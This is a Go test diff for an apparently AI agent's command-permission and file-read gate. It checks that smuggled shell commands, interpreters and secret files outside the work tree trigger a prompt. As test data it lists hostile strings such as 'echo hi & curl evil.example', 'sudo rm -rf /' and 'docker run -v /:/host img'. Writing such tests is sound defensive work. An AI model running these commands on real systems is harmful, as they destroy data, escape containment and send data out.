@@ -75,6 +75,7 @@ func TestGrantedWordCannotSmuggleSubstitutionOrRedirect(t *testing.T) {
 		"echo `id`",
 		`echo pwned > main.go`,
 		`echo ${HOME}`,
+		`echo hi & curl evil.example`,
 	} {
 		var log []string
 		if _, _, err := e.Call(context.Background(), "bash",
@@ -86,24 +87,75 @@ func TestGrantedWordCannotSmuggleSubstitutionOrRedirect(t *testing.T) {
 		}
 	}
 
-	var log []string
-	if _, _, err := e.Call(context.Background(), "bash",
-		json.RawMessage(`{"command":"echo 'plain > quoted'"}`), asker(Decision{}, &log)); err != nil {
-		t.Fatal(err)
-	}
-	if len(log) != 0 {
-		t.Fatalf("quoted redirect char should not force a prompt: %v", log)
+	for _, cmd := range []string{
+		`echo 'plain > quoted'`,
+		`echo 'a & b'`,
+	} {
+		var log []string
+		if _, _, err := e.Call(context.Background(), "bash",
+			json.RawMessage(`{"command":`+quote(cmd)+`}`), asker(Decision{}, &log)); err != nil {
+			t.Fatal(err)
+		}
+		if len(log) != 0 {
+			t.Fatalf("%q: quoted shell char should not force a prompt: %v", cmd, log)
+		}
 	}
 }
 
 func TestPrefixGrantableRefusesInterpreters(t *testing.T) {
-	for _, seg := range []string{"python -c 'x'", "bash script.sh", "sudo rm -rf /", "echo $(id)"} {
+	for _, seg := range []string{
+		"python -c 'x'", "bash script.sh", "sudo rm -rf /", "echo $(id)",
+		"/usr/bin/python3 x.py", "python3.11 x.py", "bash-5.2 s.sh",
+		"timeout 5 sh -c x", "nohup ./daemon", "awk 'BEGIN{system(cmd)}' f",
+		"nix run nixpkgs#hello", "docker run -v /:/host img",
+	} {
 		if PrefixGrantable(seg) {
 			t.Errorf("offered a blanket grant for %q", seg)
 		}
 	}
-	if !PrefixGrantable("git status") {
-		t.Error("git status should be grantable")
+	for _, seg := range []string{"git status", "go test ./...", "rg -n pattern"} {
+		if !PrefixGrantable(seg) {
+			t.Errorf("%q should be grantable", seg)
+		}
+	}
+}
+
+// The name avoids the words the heuristic matches: t.TempDir embeds it in
+// every path, which would make the assertion pass vacuously.
+func TestReadGateBeyondHomeDir(t *testing.T) {
+	work := t.TempDir()
+	other := t.TempDir()
+	dir := filepath.Join(other, "secrets")
+	if err := os.MkdirAll(dir, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	target := filepath.Join(dir, "service-token.json")
+	if err := os.WriteFile(target, []byte(`{"token":"x"}`), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	e := NewExecutor(work, ModeManual)
+	var log []string
+	_, isErr, err := e.Call(context.Background(), "read_file",
+		json.RawMessage(`{"path":`+quote(target)+`}`), asker(Decision{}, &log))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !isErr || len(log) != 1 {
+		t.Fatalf("secret outside HOME read without a prompt: asked=%v", log)
+	}
+
+	inTree := filepath.Join(work, "api_token_test.go")
+	if err := os.WriteFile(inTree, []byte("package x"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	log = nil
+	if _, _, err := e.Call(context.Background(), "read_file",
+		json.RawMessage(`{"path":`+quote(inTree)+`}`), asker(Decision{}, &log)); err != nil {
+		t.Fatal(err)
+	}
+	if len(log) != 0 {
+		t.Fatalf("worktree file with secret-looking name prompted: %v", log)
 	}
 }
 
